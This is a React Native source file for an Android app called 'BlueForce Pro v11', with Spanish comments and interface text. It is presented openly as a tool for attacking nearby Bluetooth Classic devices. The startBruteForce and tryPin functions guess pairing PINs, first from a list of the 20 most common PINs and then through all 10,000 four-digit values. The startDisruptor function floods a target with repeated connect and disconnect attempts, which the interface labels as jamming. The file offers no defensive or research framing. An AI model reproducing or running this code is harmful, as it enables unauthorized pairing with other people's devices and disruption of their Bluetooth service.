import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, TouchableOpacity, ScrollView, Alert, PermissionsAndroid, Platform, FlatList, ActivityIndicator, Modal, TextInput } from 'react-native';
import RNBluetoothClassic from 'react-native-bluetooth-classic';

// TOP 20 PINS MÁS USADOS (DICCIONARIO TÁCTICO)
const SMART_DICTIONARY = ["0000", "1234", "1111", "8888", "1212", "7777", "1004", "2000", "4444", "2222", "6969", "9999", "3333", "5555", "6666", "1122", "1313", "8080", "1515", "5678"];

const SignalMeter = ({ rssi }) => {
  let s = 0; if (rssi > -45) s = 5; else if (rssi > -60) s = 4; else if (rssi > -75) s = 3; else if (rssi > -85) s = 2; else if (rssi > -100) s = 1;
  const c = s >= 4 ? '#00ff88' : s === 3 ? '#ffea00' : '#ff3c00';
  return (<View style={styles.mC}>{[1, 2, 3, 4, 5].map(b => <View key={b} style={[styles.b, { height: b * 3, backgroundColor: b <= s ? c : '#222' }]} />)}</View>);
};

export default function App() {
  const [discoveredDevices, setDiscoveredDevices] = useState([]);
  const [history, setHistory] = useState({});
  const [aliases, setAliases] = useState({});
  const [mode, setMode] = useState('IDLE');
  const [currentPin, setCurrentPin] = useState('0000');
  const [disruptCount, setDisruptCount] = useState(0);
  const [isScanning, setIsScanning] = useState(false);
  const [modalVisible, setModalVisible] = useState(false);
  const [tempName, setTempName] = useState('');
  const [renamingAddr, setRenamingAddr] = useState('');

  useEffect(() => {
    (async () => {
      if (Platform.OS === 'android') {
        await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_ADVERTISE
        ]);
      }
    })();
  }, []);

  const scan = async () => {
    if (isScanning || mode !== 'IDLE') return;
    setIsScanning(true);
    try {
      const devices = await RNBluetoothClassic.startDiscovery();
      setDiscoveredDevices(devices.sort((a,b) => b.rssi - a.rssi));
    } catch (e) {} finally { setIsScanning(false); }
  };

  const startBruteForce = async (device) => {
    setMode('BRUTE');
    RNBluetoothClassic.cancelDiscovery(); 
    
    // FASE 1: DICCIONARIO INTELIGENTE
    for (let pin of SMART_DICTIONARY) {
        if (mode !== 'IDLE' && mode !== 'BRUTE') break;
        setCurrentPin(`DICT:${pin}`);
        const ok = await tryPin(device.address, pin);
        if (ok) return;
    }

    // FASE 2: BRUTA SECUENCIAL
    for (let i = 0; i <= 9999; i++) {
        let m; setMode(c => { m = c; return c; }); if (m !== 'BRUTE') break;
        const pin = i.toString().padStart(4, '0');
        if (SMART_DICTIONARY.includes(pin)) continue;
        setCurrentPin(pin);
        const ok = await tryPin(device.address, pin);
        if (ok) return;
        if (i > 0 && i % 8 === 0) await new Promise(r => setTimeout(r, 2000));
    }
    setMode('IDLE');
  };

  const tryPin = async (addr, pin) => {
    try {
        await Promise.race([ RNBluetoothClassic.pairDevice(addr, { pin }), new Promise(r => setTimeout(r, 1200)) ]);
        const bonded = await RNBluetoothClassic.getBondedDevices();
        if (bonded.some(d => d.address === addr)) {
            setHistory(p => ({ ...p, [addr]: { status: '🔓 CONQUISTADO', pin } }));
            setMode('IDLE'); Alert.alert("ÉXITO", "PIN ENCONTRADO: " + pin);
            return true;
        }
    } catch (e) { await new Promise(r => setTimeout(r, 400)); }
    return false;
  };

  const startDisruptor = async (device) => {
    setMode('DISRUPT'); setDisruptCount(0);
    RNBluetoothClassic.cancelDiscovery();
    let count = 0;
    while (true) {
        let m; setMode(c => { m = c; return c; }); if (m !== 'DISRUPT') break;
        count++; setDisruptCount(count);
        try {
            await Promise.all([
               RNBluetoothClassic.startDiscovery(),
               RNBluetoothClassic.connectDevice(device.address)
            ]);
            await RNBluetoothClassic.disconnectDevice(device.address);
        } catch (e) {}
        await new Promise(r => setTimeout(r, 100)); // Estabilidad
    }
    setMode('IDLE');
  };

  return (
    <View style={styles.container}>
      <Text style={styles.title}>BlueForce Pro v11</Text>
      
      <Modal visible={modalVisible} transparent={true} animationType="fade">
        <View style={styles.modalBg}><View style={styles.modalBody}>
            <TextInput style={styles.input} value={tempName} onChangeText={setTempName} placeholder="Alias de objetivo..." placeholderTextColor="#666" />
            <TouchableOpacity style={styles.mBtn} onPress={() => { if(tempName) setAliases(p=>({...p,[renamingAddr]:tempName.toUpperCase()})); setModalVisible(false); }}><Text style={styles.bt}>GUARDAR ALIAS</Text></TouchableOpacity>
            <TouchableOpacity style={{marginTop:10}} onPress={()=>setModalVisible(false)}><Text style={{color:'#444', textAlign:'center'}}>CANCELAR</Text></TouchableOpacity>
        </View></View>
      </Modal>

      <View style={[styles.panel, mode !== 'IDLE' && { borderColor: '#00f2ff', borderWidth: 1 }]}>
        <Text style={styles.pinText}>{mode === 'IDLE' ? 'HUD READY' : mode === 'DISRUPT' ? `JAM:${disruptCount}` : currentPin}</Text>
        <TouchableOpacity style={styles.scanBtn} onPress={scan} disabled={mode !== 'IDLE'}>
          {isScanning ? <ActivityIndicator color="#000" /> : <Text style={styles.scanText}>ESCANEO PRO</Text>}
        </TouchableOpacity>
      </View>

      <FlatList data={discoveredDevices} renderItem={({ item }) => {
        const h = history[item.address] || { status: '⚪' };
        const name = aliases[item.address] || item.name || "N/A";
        const isC = h.status.includes('🔓');
        return (
          <View style={styles.card}>
            <SignalMeter rssi={item.rssi} />
            <TouchableOpacity style={{ flex: 1, marginLeft: 15 }} onPress={() => { setRenamingAddr(item.address); setTempName(name); setModalVisible(true); }}>
              <Text style={styles.name}>{name}</Text>
              <Text style={styles.mac}>{item.address} | {h.status}</Text>
            </TouchableOpacity>
            <View style={{ flexDirection: 'row' }}>
              {isC ? <TouchableOpacity style={styles.aud} onPress={() => RNBluetoothClassic.connectDevice(item.address)}><Text style={styles.btAud}>CONECTAR</Text></TouchableOpacity> : 
              <>
                <TouchableOpacity style={styles.btn} onPress={() => startBruteForce(item)} disabled={mode !== 'IDLE'}><Text style={styles.bt}>PIN</Text></TouchableOpacity>
                <TouchableOpacity style={[styles.btn, {backgroundColor:'#ff0033', marginLeft: 5}]} onPress={() => startDisruptor(item)} disabled={mode !== 'IDLE'}><Text style={styles.bt}>BUG</Text></TouchableOpacity>
              </>}
            </View>
          </View>
        );
      }} />
      {mode !== 'IDLE' && <TouchableOpacity style={styles.stop} onPress={()=>setMode('IDLE')}><Text style={styles.stopT}>DETENER OPERACIÓN</Text></TouchableOpacity>}
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#05070a', padding: 20, paddingTop: 40 },
  title: { color: '#00f2ff', fontSize: 18, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
  panel: { backgroundColor: '#111', padding: 20, borderRadius: 15, marginBottom: 15 },
  pinText: { color: '#fff', fontSize: 40, fontWeight: 'bold', textAlign: 'center', marginBottom: 12, fontFamily: 'monospace' },
  scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 10, alignItems: 'center' },
  scanText: { color: '#000', fontWeight: 'bold' },
  card: { backgroundColor: '#151a22', padding: 12, borderRadius: 12, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
  name: { color: '#fff', fontWeight: 'bold', fontSize: 13 },
  mac: { color: '#444', fontSize: 9 },
  mC: { flexDirection: 'row', alignItems: 'flex-end', width: 20 },
  b: { width: 3, marginRight: 2, borderRadius: 1 },
  btn: { backgroundColor: '#222', padding: 12, borderRadius: 8 },
  aud: { backgroundColor: '#00f2ff', padding: 12, borderRadius: 8 },
  bt: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
  btAud: { color: '#000', fontSize: 10, fontWeight: 'bold' },
  modalBg: { flex: 1, backgroundColor: 'rgba(0,0,0,0.9)', justifyContent: 'center', alignItems: 'center' },
  modalBody: { backgroundColor: '#111', padding: 20, borderRadius: 15, width: '80%' },
  input: { backgroundColor: '#222', color: '#fff', padding: 12, borderRadius: 10, marginBottom: 10 },
  mBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 10, alignItems: 'center' },
  stop: { backgroundColor: '#ff0033', padding: 15, borderRadius: 12, alignItems: 'center', marginTop: 10 },
  stopT: { color: '#fff', fontWeight: 'bold' }
});
